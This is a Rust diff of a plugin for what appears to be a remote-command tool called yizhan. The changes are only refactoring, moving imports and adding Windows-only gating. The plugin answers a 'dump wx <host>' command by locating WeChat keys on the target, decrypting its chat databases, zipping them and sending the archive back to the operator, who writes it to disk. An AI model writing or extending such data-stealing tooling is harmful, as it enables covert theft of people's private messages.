@@ -1,17 +1,18 @@
-use std::io::{Cursor, Write};
-
-use tracing::{info, warn};
-use yizhan_bootstrap::get_program_dir;
-use yizhan_plugin::Plugin;
-use yizhan_protocol::command::{UserCommand, UserCommandResponse, UserCommandResult};
-use zip::ZipWriter;
+#[cfg(windows)]
+mod dump;
 
 #[derive(Default)]
+#[cfg(windows)]
 pub struct YiZhanDumpWxPlugin {}
 
 #[cfg(windows)]
-impl Plugin for YiZhanDumpWxPlugin {
-    fn parse_command(&self, inputs: &[&str]) -> Option<(Option<String>, UserCommand)> {
+impl yizhan_plugin::Plugin for YiZhanDumpWxPlugin {
+    fn parse_command(
+        &self,
+        inputs: &[&str],
+    ) -> Option<(Option<String>, yizhan_protocol::command::UserCommand)> {
+        use yizhan_protocol::command::UserCommand;
+
         match inputs {
             ["dump", "wx", host] => Some((
                 Some(host.to_string()),
@@ -25,7 +26,14 @@ impl Plugin for YiZhanDumpWxPlugin {
         }
     }
 
-    fn execute_command(&self, group_id: &str, content: &str) -> Option<UserCommandResult> {
+    fn execute_command(
+        &self,
+        group_id: &str,
+        content: &str,
+    ) -> Option<yizhan_protocol::command::UserCommandResult> {
+        use tracing::{info, warn};
+        use yizhan_protocol::command::{UserCommandResponse, UserCommandResult};
+
         match (group_id, content) {
             ("dump", "wx") => {
                 info!("Finding wechat info ...");
@@ -68,11 +76,13 @@ impl Plugin for YiZhanDumpWxPlugin {
         &self,
         response: &yizhan_protocol::command::UserCommandResponse,
     ) -> Option<String> {
+        use yizhan_protocol::command::UserCommandResponse;
+
         match response {
             UserCommandResponse::PluginBinaryCommand(group_id, cmd, bytes)
                 if group_id == "dump" && cmd == "db" =>
             {
-                let mut db_file = get_program_dir().ok()?;
+                let mut db_file = yizhan_bootstrap::get_program_dir().ok()?;
                 db_file.push("wx-db-dump.zip");
 
                 std::fs::write(&db_file, bytes).ok()?;
@@ -88,6 +98,13 @@ impl Plugin for YiZhanDumpWxPlugin {
 
 #[cfg(windows)]
 fn dump_wx_db() -> anyhow::Result<Vec<u8>> {
+    use std::io::{Cursor, Write};
+
+    use tracing::info;
+    use zip::ZipWriter;
+
+    use crate::dump::{decrypt_wechat_db_file, WeChatPrivateInfo, WxDbFiles};
+
     let mut buffer = Vec::new();
     let cursor = Cursor::new(&mut buffer);
     let mut zip = ZipWriter::new(cursor);
